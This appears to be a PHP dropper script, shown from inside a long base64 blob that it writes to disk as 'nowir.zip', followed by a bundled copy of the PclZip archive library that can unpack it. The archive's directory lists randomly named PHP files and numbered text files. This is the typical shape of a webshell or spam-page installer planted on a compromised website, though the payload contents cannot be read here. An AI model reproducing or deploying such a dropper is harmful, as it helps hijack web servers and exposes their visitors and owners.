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"); 
file_put_contents("nowir.zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
